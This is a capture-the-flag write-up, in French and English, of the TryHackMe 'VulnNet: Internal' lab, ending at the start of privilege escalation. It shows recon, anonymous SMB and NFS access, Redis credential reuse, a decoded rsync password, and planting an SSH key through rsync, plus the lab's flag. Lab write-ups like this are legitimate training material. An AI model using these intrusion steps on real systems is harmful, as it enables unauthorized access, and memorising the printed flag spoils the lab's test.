## Recon

```sh
└─# rustscan --ulimit 5000 -b 1000 -n -a 10.10.220.246
Host is up, received timestamp-reply ttl 61 (0.65s latency).
Scanned at 2024-05-17 15:42:32 EDT for 1s

PORT    STATE SERVICE     REASON
22/tcp  open  ssh         syn-ack ttl 61
111/tcp open  rpcbind     syn-ack ttl 61
139/tcp open  netbios-ssn syn-ack ttl 61


```

i have port `139` donc je vais lancer `enum4linux`


```sh
# enum4linux -a 10.10.220.246
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May 17 15:42:48 2024
 ===============================( Nbtstat Information for 10.10.220.246 )===============================

Looking up status of 10.10.220.246
        VULNNET-INTERNA <00> -         B <ACTIVE>  Workstation Service
        VULNNET-INTERNA <03> -         B <ACTIVE>  Messenger Service
        VULNNET-INTERNA <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections


[+] Got OS info for 10.10.220.246 from srvinfo: 
        VULNNET-INTERNAWk Sv PrQ Unx NT SNT vulnnet-internal server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =================================( Share Enumeration on 10.10.220.246 )=================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
[+] Attempting to map shares on 10.10.220.246

//10.10.220.246/print$  Mapping: DENIED Listing: N/A Writing: N/A
//10.10.220.246/shares  Mapping: OK Listing: OK Writing: N/A


```

Acceder au partage de `Shares`


```sh
└─# smbclient //10.10.220.246/shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278712 blocks available
smb: \> cd data
smb: \data\> dir
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021


```


for the port `111`, I will mount 

```sh
─# showmount -e 10.10.220.246
Export list for 10.10.220.246:
/opt/conf *
└─# mount -o nolock 10.10.220.246:/opt/conf mnt 
# ls mnt 
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                                                                     
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe]
└─# ls mnt/redis
redis.conf
```

Une configuration `redis` et je trouve un password
```sh
#
# 2) if slave-serve-stale-data is set to 'no' the slave will reply with
#    an error "SYNC with master in progress" to all the kind of commands
#    but to INFO and SLAVEOF.
#
slave-serve-stale-data yes

requirepass "B65Hx562F@ggAZ@F"
```

Je vais d'abord verifier s'il ya un `redis` qui est ouvert

```sh
─# nc -nv 10.10.220.246 6379
(UNKNOWN) [10.10.220.246] 6379 (redis) open
```

Maintenant je vais utiliser l'outil `redis-cli` pour m'y connecter

```sh
─# redis-cli -h 10.10.220.246 --pass 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.220.246:6379> INFO
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:489
run_id:94d8fdcc6c56026d36bd87180f925f9ca616ba31
tcp_port:6379
uptime_in_seconds:1653
uptime_in_days:0
hz:10
lru_clock:4700236
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

10.10.220.246:6379> config get dir
1) "dir"
2) "/var/lib/redis"
(0.65s)
10.10.220.246:6379> 

```

- https://www.javatpoint.com/redis-all-commands


```sh
10.10.220.246:6379>  CLIENT GETNAME 
(nil)
(4.62s)
10.10.220.246:6379> KEYS *
1) "int"
2) "tmp"
3) "internal flag"
4) "authlist"
5) "marketlist"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
(0.65s)
10.10.220.246:6379> 


```
Ici ce que j'ai fais est :
- J'ai utiliser le parametre `KEYS *`  pour Trouver toutes les clés disponible.
- Ensuite le `GET keyname` pour lire le key

```sh
10.10.220.246:6379> LRANGE marketlist 1 3
1) "Penetration Testing"
2) "Programming"
3) "Data Analysis"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> LRANGE authlist 1 3
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
(0.65s)
10.10.220.246:6379> 
```

- Ici j'utilise `LRANGE key start stop` pour Obtenir une plage d'éléments d'une liste

Je viens d'avoir un base64, donc je le decode
```sh
# echo $base| base64 -d      
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
                                                                                   
```
on me renvoi dans un `rsync` et je vais utiliser `rsync` pour me connecter

- https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/

```sh
# nc -nv 10.10.220.246 873 
(UNKNOWN) [10.10.220.246] 873 (rsync) open
@RSYNCD: 31.0

# rsync --list-only rsync://rsync-connect@10.10.220.246/files
Password: 
drwxr-xr-x          4,096 2021/02/01 07:51:14 .
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
drwxrwxr-x          4,096 2021/02/06 06:43:14 sys-internal/.ssh
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails/large
drwx------          4,096 2021/02/02 06:16:18 sys-internal/.thumbnails/normal
-rw-------          8,437 2021/02/02 06:16:17 sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png
-rw-------          6,345 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png
-rw-------            978 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png
drwx------          4,096 2021/02/01 07:53:21 sys-internal/Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 sys-internal/Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Videos

sent 185 bytes  received 76,450 bytes  5,285.17 bytes/sec
total size is 41,708,382  speedup is 544.25

```

##  Sync the authorized_keys with the remote .ssh directory


```sh
└─# cat /root/.ssh/id_rsa.pub > authorized_keys 
─# rsync authorized_keys rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
─# rsync --list-only rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2024/05/17 16:41:05 .
-rw-r--r--             22 2024/05/17 16:41:05 authorized_keys
                                                              
─# ssh sys-internal@10.10.220.246                                                    
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch


```



## Escalation
1st i will try the version

```sh
sys-internal@vulnnet-internal:/home$ uname -a
Linux vulnnet-internal 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux


```
